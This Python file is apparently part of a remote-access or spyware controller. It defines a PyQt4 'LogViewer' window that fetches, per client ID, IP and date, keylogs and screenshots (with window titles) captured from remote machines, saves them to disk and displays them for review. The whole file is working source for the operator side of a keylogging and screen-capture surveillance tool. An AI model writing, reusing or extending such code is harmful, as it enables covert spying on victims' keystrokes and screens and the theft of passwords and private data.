from ui.logViewer import Ui_Form as logViewerUi
from PyQt4.QtGui import *
from PyQt4.QtCore import *

import os

from libs.data_transfer import data_get, data_send, data_receive
from language import Translate

# Multi Lang
translate = Translate()
_ = lambda _word: translate.word(_word)


class LogViewer(QWidget, logViewerUi):

    def __init__(self, args):
        QWidget.__init__(self)
        self.setupUi(self)

        self.socket = args['sock']
        self.client_id = args['key']
        self.client_alias = args['alias']
        self.client_ip_address = args['ip_address']
        self.client_os = args['os']
        self.session_id = args['session_id']

        # update gui
        self.gui = QApplication.processEvents

        self.screenshots_dict = {}
        self.keylogs_dict = {}

        self.date = str(self.timeCalendar.selectedDate().toPyDate())

        # Triggers
        self.timeCalendar.clicked.connect(self.check_data_counts)
        self.downloadButton.clicked.connect(self.download_data)

        self.screenshotsTable.doubleClicked.connect(self.open_screenshot)
        self.keylogsTable.doubleClicked.connect(self.open_keylog)

        # Init
        self.init_ui()
        self.set_language()
        self.check_data_counts()

    def init_ui(self):
        self.clientIdLine.setText(self.client_id)
        self.clientAliasLine.setText(self.client_alias)
        self.clientIpLine.setText(self.client_ip_address)
        self.clientOsLine.setText(self.client_os)

        # Hide Progress Bar
        self.downloadProgress.setHidden(True)
        self.downloadedLabel.setHidden(True)

        # Hide Path Columns
        self.screenshotsTable.setColumnHidden(2, True)
        self.keylogsTable.setColumnHidden(2, True)

    def set_language(self):
        self.setWindowTitle(_('VIEWER_WINDOW_TITLE'))
        self.logsTab.setTabText(0, _('VIEWER_SCREENSHOTS_TAB'))
        self.logsTab.setTabText(1, _('VIEWER_KEYLOGS_TAB'))
        self.logsTab.setTabText(2, _('VIEWER_AUDIO_TAB'))
        self.screenshotsTable.horizontalHeaderItem(0).setText(_('VIEWER_SCREENSHOT_PREVIEW'))
        self.screenshotsTable.horizontalHeaderItem(1).setText(_('VIEWER_SCREENSHOT_INFO'))
        # Keylogger
        # Audio
        self.clientInformationGroup.setWindowTitle(_('VIEWER_CLIENT_GROUP_TITLE'))
        self.clientIdLabel.setText(_('VIEWER_CLIENT_ID'))
        self.clientAliasLabel.setText(_('VIEWER_CLIENT_ALIAS'))
        self.clientIpLabel.setText(_('VIEWER_CLIENT_IP'))
        self.clientOsLabel.setText(_('VIEWER_CLIENT_OS'))
        self.downloadGroup.setWindowTitle(_('VIEWER_DOWNLOAD_GROUP_TITLE'))
        self.ignoreViewedCheck.setText(_('VIEWER_IGNOR_VIEWED'))
        self.downloadButton.setText(_('VIEWER_DOWNLOAD'))

    def update_date(self):
        self.date = str(self.timeCalendar.selectedDate().toPyDate())

    def check_data_counts(self):
        self.update_date()

        # Check Screenshots
        data = data_get(self.socket, '%s %s' % (self.client_id, self.date), 'countScreenshots', session_id=self.session_id)
        new, old = data['payload'].split('/')
        self.screenshotsCountNewLabel.setText(new)
        self.screenshotsCountOldLabel.setText(old)

        # Check Keylogs
        data = data_get(self.socket, '%s %s' % (self.client_id, self.date), 'countKeylogs', session_id=self.session_id)
        new, old = data['payload'].split('/')
        self.keylogsCountNewLabel.setText(new)
        self.keylogsCountOldLabel.setText(old)

        # Check Audio

    def open_screenshot(self):
        current_screenshot_path = str(self.screenshotsTable.item(self.screenshotsTable.currentRow(), 2).text())
        os.startfile(current_screenshot_path)

    def open_keylog(self):
        current_keylog_path = str(self.keylogsTable.item(self.keylogsTable.currentRow(), 2).text())
        os.startfile(current_keylog_path)

    def download_data(self):

        selected_date = self.date

        selected_dir = str(QFileDialog.getExistingDirectory(self, _('VIEWER_SELECT_DIR')))
        if len(selected_dir) == 0:
            return
        screenshots_dir = os.path.join(selected_dir, self.client_id, selected_date, 'Screenshots')
        if not os.path.exists(screenshots_dir):
            os.makedirs(screenshots_dir)

        filter_downloaded = 1 if self.ignoreViewedCheck.isChecked() else 0

        # Download Screenshots
        if self.screenshotsEnableButton.isChecked():
            count_data = data_get(self.socket, '%s %s %s' % (self.client_id, self.date, filter_downloaded), 'downloadScreenshots', self.session_id)
            if count_data['mode'] == 'noDataFound':
                return
            all_data_count = count_data['mode']

            # Prepar Progress Bar
            self.downloadProgress.setHidden(False)
            self.downloadedLabel.setHidden(False)
            self.downloadedLabel.setText('Downloading Screenshots 0/%s' % all_data_count)
            self.downloadProgress.setMaximum(int(all_data_count))
            self.downloadProgress.setValue(0)

            screenshots_names = count_data['payload']
            self.screenshots_dict = {}
            for index, name in enumerate(screenshots_names):
                self.gui()
                screenshot = data_get(self.socket, name, 'downloadScreenshot', self.session_id)
                if screenshot['mode'] == 'noDataFound':
                    continue
                else:
                    path = os.path.join(screenshots_dir, screenshot['payload']['datetime']+'.png')
                    with open(path, 'wb') as screenshot_file:
                        screenshot_file.write(screenshot['payload']['raw'])
                    self.screenshots_dict[screenshot['payload']['datetime']] = {
                        'datetime': screenshot['payload']['datetime'],
                        'date': screenshot['payload']['date'],
                        'window_title': screenshot['payload']['window_title'],
                        'path': path,
                    }
                    # Update Progress
                    self.downloadedLabel.setText('Downloading Screenshot %s/%s' % (index+1, all_data_count))
                    self.downloadProgress.setValue(index+1)
            # Finish
            self.downloadedLabel.setText('Screenshots Downloading Finished')
            self.downloadProgress.setHidden(True)
            self.downloadedLabel.setHidden(True)

        keylogs_dir = os.path.join(selected_dir, self.client_id, selected_date, 'Keylogs')
        if not os.path.exists(keylogs_dir):
            os.makedirs(keylogs_dir)

        # Download Keylogs
        if self.keylogsEnableButton.isChecked():
            count_data = data_get(self.socket, '%s %s %s' % (self.client_id, self.date, filter_downloaded), 'downloadKeylogs', self.session_id)
            if count_data['mode'] == 'noDataFound':
                return
            all_data_count = count_data['mode']

            # Prepar Progress Bar
            self.downloadProgress.setHidden(False)
            self.downloadedLabel.setHidden(False)
            self.downloadedLabel.setText('Downloading Keylogs 0/%s' % all_data_count)
            self.downloadProgress.setMaximum(int(all_data_count))
            self.downloadProgress.setValue(0)

            keylogs_name = count_data['payload']
            self.keylogs_dict = {}
            for index, name in enumerate(keylogs_name):
                self.gui()
                keylog = data_get(self.socket, name, 'downloadKeylog', self.session_id)
                if keylog['mode'] == 'noDataFound':
                    continue
                else:
                    path = os.path.join(keylogs_dir, keylog['payload']['datetime']+'.html')
                    with open(path, 'wb') as keylog_file:
                        keylog_file.write(keylog['payload']['raw'])
                    self.keylogs_dict[keylog['payload']['datetime']] = {
                        'datetime': keylog['payload']['datetime'],
                        'date': keylog['payload']['date'],
                        'path': path,
                    }
                    # Update Progress
                    self.downloadedLabel.setText('Downloading Keylog %s/%s' % (index+1, all_data_count))
                    self.downloadProgress.setValue(index+1)
            # Finish
            self.downloadedLabel.setText('Keylogs Downloading Finished')
            self.downloadProgress.setHidden(True)
            self.downloadedLabel.setHidden(True)

        # Download Audio
        if self.audioEnableButton.isChecked():
            pass

        # All Finished
        self.check_data_counts()
        # Update Table
        self.update_tables()

    def update_tables(self):

        if len(self.screenshots_dict) > 0:
            self.screenshotsTable.setRowCount(len(self.screenshots_dict))
            self.screenshotsTable.setColumnWidth(0, 180)
            for index, key in enumerate(self.screenshots_dict):
                self.gui()

                # add screenshot preview
                im = self.screenshots_dict[key]['path']
                image = QImage(im)
                pixmap = QPixmap.fromImage(image)
                previews_dict = QLabel()
                previews_dict.setPixmap(pixmap.scaled(200, 200, Qt.KeepAspectRatio))
                previews_dict.setScaledContents(True)
                self.screenshotsTable.setCellWidget(index, 0, previews_dict)

                # add screenshot information
                payload = '''
                <p align="center"><font color="#e67e22">%s</font></p>
                %s
                ''' % (self.screenshots_dict[key]['datetime'], self.screenshots_dict[key]['window_title'])
                infoText = QTextEdit()
                infoText.setReadOnly(True)
                infoText.setStyleSheet('background: #2c3e50;\nborder: 1px ridge;\nborder-color: #2c3e50;\nborder-top: none;\npadding: 3px;')
                infoText.insertHtml(payload)
                self.screenshotsTable.setCellWidget(index, 1, infoText)

                # add path
                item = QTableWidgetItem(self.screenshots_dict[key]['path'])
                self.screenshotsTable.setItem(index, 2, item)

        if len(self.keylogs_dict) > 0:
            self.keylogsTable.setRowCount(len(self.keylogs_dict))
            for index, key in enumerate(self.keylogs_dict):
                self.gui()

                # add date
                item = QTableWidgetItem(self.keylogs_dict[key]['datetime'])
                item.setTextColor(QColor('#f39c12'))
                self.keylogsTable.setItem(index, 0, item)

                # add log preview
                log = open(self.keylogs_dict[key]['path'], 'r').readline()
                html_snippets = ['<p align="center" style="background-color: #34495e;color: #ecf0f1;">',
                                '<br>',
                                '<font color="#e67e22">',
                                '</font>',
                                '</p>']
                for i in html_snippets:
                    log = log.replace(i, '')
                item = QTableWidgetItem(log.decode('utf-8'))
                self.keylogsTable.setItem(index, 1, item)

                # add path
                item = QTableWidgetItem(self.keylogs_dict[key]['path'])
                self.keylogsTable.setItem(index, 2, item)